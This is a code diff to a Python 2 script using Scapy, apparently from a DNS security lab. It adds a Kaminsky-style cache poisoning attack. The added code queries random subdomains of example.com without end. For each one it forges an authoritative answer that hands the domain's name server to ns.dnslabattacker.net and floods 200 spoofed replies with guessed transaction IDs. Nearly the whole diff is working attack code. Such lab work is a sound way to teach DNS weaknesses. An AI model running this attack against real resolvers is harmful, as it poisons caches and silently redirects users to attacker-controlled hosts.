@@ -55,5 +55,33 @@ def exampleSendDNSQuery():
     print response.show()
     print "***** End of Remote Server Packet *****\n"
 
+def sendRandomDNSQuery(name, sock):
+    #sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=name + '.example.com'))
+    sendPacket(sock, dnsPacket, my_ip, my_port)
+    '''response = sock.recv(4096)
+    response = DNS(response)
+    print "\n***** Packet Received from Remote Server *****"
+    print response.show()
+    print "***** End of Remote Server Packet *****\n"
+    return response'''
+def generateSpoofedDNS(name):
+    spoofedRes = DNS()
+    spoofedRes.qr = 1
+    spoofedRes.aa = 1
+    spoofedRes.qd = DNSQR(qname=name+'.example.com')
+    spoofedRes.an = DNSRR(ttl=1200, type="A",rrname=name+'.example.com',rdata="1.1.1.1")
+    spoofedRes.ns = DNSRR(ttl=1200,type="NS", rrname="example.com", rdata= "ns.dnslabattacker.net")
+    spoofedRes.ar = DNSRR(ttl=1200,rrname= "ns.dnslabattacker.net", type="A", rdata="1.1.1.1")
+    spoofedRes.id = getRandomTXID()
+    return spoofedRes
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    while 1:
+        randomName = getRandomSubDomain()
+        sendRandomDNSQuery(randomName,sock)
+        spoofedPacket=generateSpoofedDNS(randomName)
+        print(spoofedPacket.show())
+        for i in range(200):
+            spoofedPacket.id = getRandomTXID()
+            sendPacket(sock, spoofedPacket, my_ip, my_query_port)
